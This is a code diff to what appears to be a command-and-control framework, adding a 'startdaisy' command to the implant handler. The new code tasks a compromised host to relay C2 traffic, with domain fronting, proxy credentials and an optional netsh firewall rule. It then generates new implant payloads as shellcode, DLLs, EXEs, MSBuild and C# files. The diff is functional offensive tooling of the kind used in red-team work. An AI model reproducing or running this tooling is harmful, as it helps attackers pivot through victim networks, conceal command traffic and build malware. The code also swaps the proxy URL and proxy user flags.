@@ -191,6 +191,9 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("reversedns"):
         do_reversedns(user, command, randomuri)
         return
+    elif command.startswith("startdaisy"):
+        do_startdaisy(user, command, randomuri)
+        return
     else:
         if command:
             do_shell(user, command, randomuri)
@@ -791,3 +794,93 @@ def do_reversedns(user, command, randomuri):
 
 def do_shell(user, command, randomuri):
     new_task(command, user, randomuri)
+
+
+def do_startdaisy(user, command, randomuri):
+    check_module_loaded("invoke-daisychain.ps1", randomuri, user)
+
+    elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)
+
+    domain_front = ""
+    proxy_user = ""
+    proxy_pass = ""
+    proxy_url = ""
+
+    if elevated.lower() == "n":
+        cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
+        if cont.lower() == "n" or cont == "":
+            return
+
+        bind_ip = "localhost"
+
+    else:
+        bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)
+
+    bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
+    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
+    if firstdaisy.lower() == "y" or firstdaisy == "":
+        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {PayloadCommsHost}): " + Colours.END)
+        if DomainFrontHeader:
+            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {DomainFrontHeader}): " + Colours.END)
+        else:
+            domain_front = input(Colours.GREEN + f"Domain front header (leave blank for configured value of no header): " + Colours.END)
+        proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
+        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
+        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
+
+        if not upstream_url:
+            upstream_url = PayloadCommsHost
+        if not domain_front:
+            domain_front = DomainFrontHeader
+
+    else:
+        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
+        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
+        upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"
+
+    command = f"invoke-daisychain -daisyserver http://{bind_ip} -port {bind_port} -c2server {upstream_url}"
+
+    if domain_front:
+        command = command + f" -domfront {domain_front}"
+    if proxy_user:
+        command = command + f" -proxyurl {proxy_url}"
+    if proxy_url:
+        command = command + f" -proxyuser {proxy_user}"
+    if proxy_pass:
+        command = command + f" -proxypassword {proxy_pass}"
+
+    if elevated.lower() == "y" or elevated == "":
+
+        firewall = input(Colours.GREEN + "Add firewall rule? (uses netsh.exe) y/N: ")
+        if firewall.lower() == "n" or firewall == "":
+            command = command + " -nofwrule"
+
+    else:
+        print_good("Not elevated so binding to localhost and not adding firewall rule")
+        command = command + " -localhost"
+
+    urls = get_allurls()
+    command = command + f" -urls '{urls}'"
+    new_task(command, user, randomuri)
+    update_label("DaisyHost", randomuri)
+
+    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")
+
+    if createpayloads.lower() == "y" or createpayloads == "":
+
+        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)
+
+        daisyhost = get_implantdetails(randomuri)
+        proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+        C2 = get_c2server_all()
+        newPayload = Payloads(C2[5], C2[2], f"\"http://{bind_ip}:{bind_port}\"", "\"\"", "", "", "", "",
+                                "", proxynone, C2[17], C2[18], C2[19], "%s?d" % get_newimplanturl(), PayloadsDirectory)
+        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost[11], daisyhost[3]))
+        newPayload.CreateRaw(name)
+        newPayload.CreateDlls(name)
+        newPayload.CreateShellcode(name)
+        newPayload.CreateEXE(name)
+        newPayload.CreateMsbuild(name)
+        newPayload.CreateCS(name)
+        new_urldetails(name, C2[1], C2[3], f"Daisy: {name}", upstream_url, daisyhost[0], "")
+        print_good("Created new %s daisy payloads" % name)
